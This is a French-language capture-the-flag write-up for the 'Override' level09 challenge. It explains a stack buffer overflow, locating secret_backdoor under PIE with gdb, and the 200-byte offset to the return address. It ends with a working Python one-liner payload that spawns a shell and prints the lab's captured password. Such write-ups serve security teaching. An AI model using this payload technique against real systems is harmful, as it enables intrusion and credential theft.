# Exploitation niveau 09 - Override

## 🧩 Analyse globale

* Le programme demande un username et un message.
* Il stocke le username dans une zone **au-delà** du buffer principal (offset +140).
* Il utilise une taille max pour copier le message stockée dans le buffer même (à l’offset 180), ce qui dépasse la taille initiale de `buffer[140]`.
* Cette manipulation d’adresses hors des limites du buffer principal peut provoquer des **vulnérabilités de type dépassement de tampon (buffer overflow)**.
* La fonction `secret_backdoor` est **une porte cachée**, qui, si appelée (par un débordement par exemple), permet d’exécuter n’importe quelle commande shell.
* L’exploitation probable consiste à déborder le buffer dans `handle_msg` pour écraser le retour de fonction ou un pointeur de fonction et appeler `secret_backdoor`, avec une chaine "/bin/sh" et ça devrait être bon.

---

## 🧪 Entrée 1 (username)

* 40 caractères utiles
* 1 octet (`\xff`) pour augmenter artificiellement la taille de copie
* → Dépassement autorisé dans `set_message()`

## 📝 Entrée 2 (message)

* Chaîne très longue qui déborde et écrase RIP
* → saut vers `secret_backdoor()`
* Appel de `system()` via `fgets()`

Tu tapes `/bin/sh` → shell

---

## 🔎 Adresse de `secret_backdoor`

L'adresse trouvée avec gdb initialement :

```
0x000000000000088c
```

Mais après plusieurs essais, elle ne fonctionne pas. On a donc cherché plus précisément avec un breakpoint dans `main` :

```gdb
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r
Starting program: /home/users/level09/level09 

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) p secret_backdoor 
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

Nouvelle adresse : `0x55555555488c`

✅ Pourquoi ? Car cette adresse varie à l’exécution puisque :

### PIE activé (Position Independent Executable)

Cela signifie que le segment `.text` du binaire est chargé à une **adresse aléatoire** à chaque exécution.

Donc :

```
0x000000000000088c (offset dans le binaire)
→ devient à l’exécution → 0x55555555488c
```

Tu ne peux donc pas hardcoder l'adresse sans la récupérer dynamiquement (via `gdb`, `leak`, etc.).

---

## 🧠 Comprendre le rôle de RBP et RIP dans l’exploitation

Quand une fonction comme `handle_msg()` est appelée, le programme crée une **stack frame** (zone mémoire locale temporaire) pour stocker :

* Les **variables locales**
* Le **registre de base `RBP`** (pointeur de base de la frame)
* L’**adresse de retour `RIP`** (où aller après la fonction)

### 📊 Structure typique d'une stack frame à l'entrée de `handle_msg()` :

```
+---------------------+
|   Adresse de retour | ← RIP ← Écrasé pour rediriger le programme
+---------------------+
| Ancien RBP          | ← Sauvegarde du RBP précédent
+---------------------+
| max_len (int)       | ← 4 octets
+---------------------+
| zero5               | ← 8 octets
| zero4               | ← 8 octets
| zero3               | ← 8 octets
| zero2               | ← 8 octets
| zero1               | ← 8 octets
+---------------------+
| buffer[140]         | ← Notre cible pour le débordement
+---------------------+
```

* Le `buffer[140]` est alloué en premier sur la stack.
* Ensuite viennent les 5 variables `long long zeroX` (8 octets chacune).
* Puis l'entier `max_len`, et enfin :

  * Le **registre `RBP`** : contient la base de la stack frame précédente.
  * Le **registre `RIP`** : contient l’adresse de retour (là où le programme ira après `handle_msg()`).

### 🧨 Pourquoi on veut atteindre RIP ?

En C, quand une fonction se termine, elle exécute une instruction `ret` :

```asm
ret
```

Cette instruction lit l’adresse stockée dans `RIP` (qu’elle récupère de la stack) pour **continuer l’exécution du programme**.

➡️ **Si tu modifies `RIP`**, tu peux dire au programme :

> « À la fin de la fonction, au lieu de retourner là où tu veux, **va exécuter ce que je t’indique**. »

---

## 📏 Comment on calcule l’offset exact jusqu’à RIP ?

| Élément                        | Taille cumulée |
| ------------------------------ | -------------- |
| `buffer[140]`                  | 140 octets     |
| `zero1` à `zero5`              | 5 × 8 = 40     |
| `max_len`                      | 4 octets       |
| `padding` (alignement mémoire) | 4 octets       |
| `saved RBP`                    | 8 octets       |
| → Adresse de retour `RIP`      | **+8**         |
| **Total pour atteindre RIP**   | **200 octets** |

Donc, **en écrivant 200 octets dans `buffer`**, tu écrases exactement `RIP`.

### 🧠 Résumé visuel

```
[ buffer[140] ][ 5*8 bytes zeroX ][ max_len (4B) ][ padding ][ RBP ][ RIP ]
       ↑                              ↑                           ↑
    Départ                      *(buffer+180)                Cible finale
```

---

### 🧪 Exploit final

```bash
(python -c 'print "A" * 40 + "\xff" + "\n" + "B"* 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh" + "\n"'; cat) | ./level09
```

Puis :

```bash
whoami
# end
cat /home/users/end/.pass
# j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
